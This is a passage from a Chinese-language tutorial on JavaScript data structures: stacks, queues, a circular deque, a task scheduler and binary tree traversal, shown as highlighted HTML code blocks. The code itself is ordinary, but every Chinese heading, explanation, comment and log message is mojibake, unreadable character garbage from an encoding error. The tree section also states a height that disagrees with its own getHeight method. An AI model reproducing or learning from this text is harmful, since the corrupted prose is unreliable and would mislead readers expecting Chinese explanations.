<li>å®é™…é€‰æ‹©ï¼šJavaScript æ•°ç»„ç»è¿‡V8å¼•æ“ä¼˜åŒ–ï¼Œé€šå¸¸æ•°ç»„æ ˆæ€§èƒ½æ›´å¥½</li>
</ul>
<h3 data-id="heading-7">æ ˆçš„å®é™…åº”ç”¨</h3>
<h4 data-id="heading-8">åº”ç”¨1ï¼šå‡½æ•°è°ƒç”¨æ ˆæ¨¡æ‹Ÿ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CallStackSimulator</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">callStack</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayStack</span>(<span class="hljs-number">50</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentDepth</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxDepth</span> = <span class="hljs-number">0</span>;
  }

  <span class="hljs-comment">// å‡½æ•°è°ƒç”¨</span>
  <span class="hljs-title function_">callFunction</span>(<span class="hljs-params">funcName</span>) {
    <span class="hljs-keyword">const</span> frame = {
      funcName,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">localVars</span>: {}
    };

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">callStack</span>.<span class="hljs-title function_">push</span>(frame);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentDepth</span>++;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxDepth</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">maxDepth</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentDepth</span>);

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è°ƒç”¨: <span class="hljs-subst">${funcName}</span> (æ·±åº¦: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentDepth}</span>)`</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">printStack</span>();

    <span class="hljs-keyword">return</span> frame;
  }

  <span class="hljs-comment">// å‡½æ•°è¿”å›</span>
  <span class="hljs-title function_">returnFromFunction</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">callStack</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è°ƒç”¨æ ˆå·²ç©º'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-keyword">const</span> frame = <span class="hljs-variable language_">this</span>.<span class="hljs-property">callStack</span>.<span class="hljs-title function_">pop</span>();
    <span class="hljs-keyword">const</span> duration = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - frame.<span class="hljs-property">timestamp</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentDepth</span>--;

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è¿”å›: <span class="hljs-subst">${frame.funcName}</span> (è€—æ—¶: <span class="hljs-subst">${duration}</span>ms)`</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å‰©ä½™æ·±åº¦: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentDepth}</span>`</span>);

    <span class="hljs-keyword">return</span> frame;
  }
}
</code></pre>
<h2 data-id="heading-9">é˜Ÿåˆ—ï¼ˆQueueï¼‰ä¸åŒç«¯é˜Ÿåˆ—ï¼ˆDequeï¼‰</h2>
<h3 data-id="heading-10">é˜Ÿåˆ—ï¼ˆQueueï¼‰çš„åŸºæœ¬æ¦‚å¿µ</h3>
<p><strong>é˜Ÿåˆ—</strong> æ˜¯ä¸€ç§<strong>å…ˆè¿›å…ˆå‡º</strong>ï¼ˆFIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œå°±åƒæ’é˜Ÿä¹°ç¥¨ï¼Œå…ˆæ¥çš„äººå…ˆæœåŠ¡ã€‚</p>
<h3 data-id="heading-11">é˜Ÿåˆ—çš„æ“ä½œç¤ºæ„å›¾</h3>
<pre><code class="hljs language-text" lang="text">      enqueue(3)    enqueue(5)    dequeue() â†’ 3
â”Œâ”€â”€â”€â”¬â”€â”€â”€â”  â†’  â”Œâ”€â”€â”€â”¬â”€â”€â”€â”  â†’  â”Œâ”€â”€â”€â”¬â”€â”€â”€â”  â†’  â”Œâ”€â”€â”€â”¬â”€â”€â”€â”
â”‚   â”‚   â”‚     â”‚ 3 â”‚   â”‚     â”‚ 3 â”‚ 5 â”‚     â”‚   â”‚ 5 â”‚
â””â”€â”€â”€â”´â”€â”€â”€â”˜     â””â”€â”€â”€â”´â”€â”€â”€â”˜     â””â”€â”€â”€â”´â”€â”€â”€â”˜     â””â”€â”€â”€â”´â”€â”€â”€â”˜
front rear   frontâ†‘rear    front rearâ†‘     â†‘front rear
</code></pre>
<h3 data-id="heading-12">åŒç«¯é˜Ÿåˆ—ï¼ˆDequeï¼‰çš„åŸºæœ¬æ¦‚å¿µ</h3>
<p><strong>åŒç«¯é˜Ÿåˆ—</strong> å…è®¸åœ¨ä¸¤ç«¯è¿›è¡Œæ’å…¥å’Œåˆ é™¤æ“ä½œï¼Œç»“åˆäº†æ ˆå’Œé˜Ÿåˆ—çš„ç‰¹æ€§ã€‚</p>
<h3 data-id="heading-13">åŒç«¯é˜Ÿåˆ—çš„å®ç°</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Deque</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">capacity = <span class="hljs-number">10</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(capacity);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span> = capacity;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> = <span class="hljs-number">0</span>;
  }

  <span class="hljs-comment">// å‰ç«¯æ·»åŠ </span>
  <span class="hljs-title function_">addFront</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isFull</span>()) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_resize</span>();
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span> = (<span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span> - <span class="hljs-number">1</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>) % <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span>] = element;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å‰ç«¯æ·»åŠ : <span class="hljs-subst">${element}</span>, front: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.front}</span>`</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// åç«¯æ·»åŠ </span>
  <span class="hljs-title function_">addRear</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isFull</span>()) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_resize</span>();
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span>] = element;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span> = (<span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span> + <span class="hljs-number">1</span>) % <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`åç«¯æ·»åŠ : <span class="hljs-subst">${element}</span>, rear: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.rear}</span>`</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// å‰ç«¯åˆ é™¤</span>
  <span class="hljs-title function_">removeFront</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'é˜Ÿåˆ—ä¸ºç©º'</span>);
    }

    <span class="hljs-keyword">const</span> element = <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span>];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span>] = <span class="hljs-literal">undefined</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span> = (<span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span> + <span class="hljs-number">1</span>) % <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>--;

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å‰ç«¯åˆ é™¤: <span class="hljs-subst">${element}</span>, front: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.front}</span>`</span>);
    <span class="hljs-keyword">return</span> element;
  }

  <span class="hljs-comment">// åç«¯åˆ é™¤</span>
  <span class="hljs-title function_">removeRear</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'é˜Ÿåˆ—ä¸ºç©º'</span>);
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span> = (<span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span> - <span class="hljs-number">1</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>) % <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>;
    <span class="hljs-keyword">const</span> element = <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span>];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span>] = <span class="hljs-literal">undefined</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>--;

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`åç«¯åˆ é™¤: <span class="hljs-subst">${element}</span>, rear: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.rear}</span>`</span>);
    <span class="hljs-keyword">return</span> element;
  }

  <span class="hljs-comment">// æŸ¥çœ‹å‰ç«¯</span>
  <span class="hljs-title function_">peekFront</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span>];
  }

  <span class="hljs-comment">// æŸ¥çœ‹åç«¯</span>
  <span class="hljs-title function_">peekRear</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">const</span> index = (<span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span> - <span class="hljs-number">1</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>) % <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[index];
  }

  <span class="hljs-comment">// æ‰©å®¹</span>
  <span class="hljs-title function_">_resize</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> newCapacity = <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span> * <span class="hljs-number">2</span>;
    <span class="hljs-keyword">const</span> newItems = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(newCapacity);

    <span class="hljs-comment">// å¤åˆ¶å…ƒç´ åˆ°æ–°æ•°ç»„</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>; i++) {
      <span class="hljs-keyword">const</span> index = (<span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span> + i) % <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>;
      newItems[i] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[index];
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span> = newItems;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">front</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rear</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span> = newCapacity;

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`é˜Ÿåˆ—æ‰©å®¹: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.capacity / <span class="hljs-number">2</span>}</span> â†’ <span class="hljs-subst">${newCapacity}</span>`</span>);
  }

  <span class="hljs-title function_">isEmpty</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> === <span class="hljs-number">0</span>;
  }

  <span class="hljs-title function_">isFull</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>;
  }

  <span class="hljs-keyword">get</span> <span class="hljs-title function_">size</span>() {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>;
  }
}
</code></pre>
<h3 data-id="heading-14">é˜Ÿåˆ—çš„å®é™…åº”ç”¨</h3>
<h4 data-id="heading-15">åº”ç”¨1ï¼šä»»åŠ¡è°ƒåº¦å™¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskScheduler</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">taskQueue</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CircularQueue</span>(<span class="hljs-number">100</span>);  <span class="hljs-comment">// ä»»åŠ¡é˜Ÿåˆ—</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTask</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">taskId</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isProcessing</span> = <span class="hljs-literal">false</span>;
  }

  <span class="hljs-comment">// åˆ›å»ºä»»åŠ¡</span>
  <span class="hljs-title function_">createTask</span>(<span class="hljs-params">name, duration, priority = <span class="hljs-number">0</span></span>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">id</span>: ++<span class="hljs-variable language_">this</span>.<span class="hljs-property">taskId</span>,
      name,
      duration,      <span class="hljs-comment">// ä»»åŠ¡æ‰§è¡Œæ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span>
      priority,      <span class="hljs-comment">// ä¼˜å…ˆçº§ï¼ˆæ•°å€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼‰</span>
      <span class="hljs-attr">status</span>: <span class="hljs-string">'pending'</span>,
      <span class="hljs-attr">createdAt</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">startedAt</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">completedAt</span>: <span class="hljs-literal">null</span>
    };
  }

  <span class="hljs-comment">// æ·»åŠ ä»»åŠ¡åˆ°é˜Ÿåˆ—</span>
  <span class="hljs-title function_">addTask</span>(<span class="hljs-params">task</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">taskQueue</span>.<span class="hljs-title function_">enqueue</span>(task);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä»»åŠ¡æ·»åŠ : <span class="hljs-subst">${task.name}</span> (ID: <span class="hljs-subst">${task.id}</span>)`</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">printQueueStatus</span>();

    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ­£åœ¨å¤„ç†çš„ä»»åŠ¡ï¼Œå¼€å§‹å¤„ç†</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isProcessing</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">processNextTask</span>();
    }
  }

  <span class="hljs-comment">// å¤„ç†ä¸‹ä¸€ä¸ªä»»åŠ¡</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">processNextTask</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">taskQueue</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isProcessing</span> = <span class="hljs-literal">false</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ‰€æœ‰ä»»åŠ¡å¤„ç†å®Œæˆï¼'</span>);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isProcessing</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTask</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">taskQueue</span>.<span class="hljs-title function_">dequeue</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTask</span>.<span class="hljs-property">status</span> = <span class="hljs-string">'processing'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTask</span>.<span class="hljs-property">startedAt</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`\nå¼€å§‹å¤„ç†ä»»åŠ¡: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentTask.name}</span>`</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä»»åŠ¡ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentTask.id}</span>, é¢„è®¡è€—æ—¶: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentTask.duration}</span>ms`</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">printQueueStatus</span>();

    <span class="hljs-comment">// æ¨¡æ‹Ÿä»»åŠ¡æ‰§è¡Œ</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">executeTask</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTask</span>);

    <span class="hljs-comment">// ä»»åŠ¡å®Œæˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTask</span>.<span class="hljs-property">completedAt</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTask</span>.<span class="hljs-property">status</span> = <span class="hljs-string">'completed'</span>;
    <span class="hljs-keyword">const</span> totalTime = <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTask</span>.<span class="hljs-property">completedAt</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTask</span>.<span class="hljs-property">startedAt</span>;

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä»»åŠ¡å®Œæˆ: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentTask.name}</span>`</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å®é™…è€—æ—¶: <span class="hljs-subst">${totalTime}</span>ms`</span>);

    <span class="hljs-comment">// å¤„ç†ä¸‹ä¸€ä¸ªä»»åŠ¡</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">processNextTask</span>();
    }, <span class="hljs-number">0</span>);
  }

  <span class="hljs-comment">// æ¨¡æ‹Ÿä»»åŠ¡æ‰§è¡Œ</span>
  <span class="hljs-title function_">executeTask</span>(<span class="hljs-params">task</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">resolve</span>();
      }, task.<span class="hljs-property">duration</span>);
    });
  }
}

</code></pre>
<h2 data-id="heading-16">æ ‘ï¼ˆTreeï¼‰çš„å®ç°ä¸åº”ç”¨</h2>
<h3 data-id="heading-17">æ ‘çš„åŸºæœ¬æ¦‚å¿µ</h3>
<p><strong>æ ‘</strong>æ˜¯ä¸€ç§åˆ†å±‚çš„æ•°æ®ç»“æ„ï¼Œç”±èŠ‚ç‚¹å’Œè¾¹ç»„æˆã€‚æ¯ä¸ªèŠ‚ç‚¹æœ‰é›¶ä¸ªæˆ–å¤šä¸ªå­èŠ‚ç‚¹ï¼Œæ²¡æœ‰çˆ¶èŠ‚ç‚¹çš„èŠ‚ç‚¹ç§°ä¸º<strong>æ ¹èŠ‚ç‚¹</strong>ï¼›æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ç§°ä¸º<strong>å¶å­èŠ‚ç‚¹</strong>ã€‚</p>
<h3 data-id="heading-18">äºŒå‰æ ‘ç»“æ„ç¤ºæ„å›¾</h3>
<pre><code class="hljs language-javascript" lang="javascript">        A (æ ¹èŠ‚ç‚¹)
       / \
      B   C
     / \   \
    D   E   F
   /
  G
</code></pre>
<p>æœ¯è¯­è§£é‡Šï¼š</p>
<ul>
<li>æ ¹èŠ‚ç‚¹: A</li>
<li>å¶å­èŠ‚ç‚¹: E, F, G</li>
<li>æ·±åº¦: èŠ‚ç‚¹Gçš„æ·±åº¦æ˜¯3</li>
<li>é«˜åº¦: æ ‘çš„é«˜åº¦æ˜¯3</li>
<li>å­æ ‘: Bã€Dã€Eã€Gæ„æˆä¸€ä¸ªå­æ ‘</li>
</ul>
<h3 data-id="heading-19">äºŒå‰æ ‘çš„å®ç°</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TreeNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;    <span class="hljs-comment">// èŠ‚ç‚¹å€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">left</span> = <span class="hljs-literal">null</span>;      <span class="hljs-comment">// å·¦å­èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">right</span> = <span class="hljs-literal">null</span>;     <span class="hljs-comment">// å³å­èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">parent</span> = <span class="hljs-literal">null</span>;    <span class="hljs-comment">// çˆ¶èŠ‚ç‚¹ï¼ˆå¯é€‰ï¼‰</span>
  }

  <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ä¸ºå¶å­èŠ‚ç‚¹</span>
  <span class="hljs-title function_">isLeaf</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">left</span> === <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">right</span> === <span class="hljs-literal">null</span>;
  }

  <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æœ‰å·¦å­èŠ‚ç‚¹</span>
  <span class="hljs-title function_">hasLeft</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">left</span> !== <span class="hljs-literal">null</span>;
  }

  <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æœ‰å³å­èŠ‚ç‚¹</span>
  <span class="hljs-title function_">hasRight</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">right</span> !== <span class="hljs-literal">null</span>;
  }

  <span class="hljs-comment">// è·å–é«˜åº¦</span>
  <span class="hljs-title function_">getHeight</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> leftHeight = <span class="hljs-variable language_">this</span>.<span class="hljs-property">left</span> ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">left</span>.<span class="hljs-title function_">getHeight</span>() : <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> rightHeight = <span class="hljs-variable language_">this</span>.<span class="hljs-property">right</span> ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">right</span>.<span class="hljs-title function_">getHeight</span>() : <span class="hljs-number">0</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(leftHeight, rightHeight) + <span class="hljs-number">1</span>;
  }
}
</code></pre>
<h3 data-id="heading-20">äºŒå‰æ ‘éå†ç®—æ³•</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BinaryTree</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span> = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// æ ¹èŠ‚ç‚¹</span>
  }

  <span class="hljs-comment">// å‰åºéå†ï¼šæ ¹ â†’ å·¦ â†’ å³</span>
  <span class="hljs-title function_">preorderTraversal</span>(<span class="hljs-params">callback</span>) {
    <span class="hljs-keyword">const</span> result = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_preorder</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>, callback, result);
    <span class="hljs-keyword">return</span> result;
  }

  <span class="hljs-title function_">_preorder</span>(<span class="hljs-params">node, callback, result</span>) {
    <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// è®¿é—®å½“å‰èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (callback) <span class="hljs-title function_">callback</span>(node);
    result.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">value</span>);

    <span class="hljs-comment">// éå†å·¦å­æ ‘</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_preorder</span>(node.<span class="hljs-property">left</span>, callback, result);

    <span class="hljs-comment">// éå†å³å­æ ‘</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_preorder</span>(node.<span class="hljs-property">right</span>, callback, result);
  }

  <span class="hljs-comment">// ä¸­åºéå†ï¼šå·¦ â†’ æ ¹ â†’ å³ï¼ˆå¯¹äºŒå‰æœç´¢æ ‘ä¼šå¾—åˆ°æœ‰åºåºåˆ—ï¼‰</span>
  <span class="hljs-title function_">inorderTraversal</span>(<span class="hljs-params">callback</span>) {
    <span class="hljs-keyword">const</span> result = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_inorder</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>, callback, result);
    <span class="hljs-keyword">return</span> result;
  }

  <span class="hljs-title function_">_inorder</span>(<span class="hljs-params">node, callback, result</span>) {
    <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// éå†å·¦å­æ ‘</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_inorder</span>(node.<span class="hljs-property">left</span>, callback, result);

    <span class="hljs-comment">// è®¿é—®å½“å‰èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (callback) <span class="hljs-title function_">callback</span>(node);
    result.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">value</span>);

    <span class="hljs-comment">// éå†å³å­æ ‘</span>
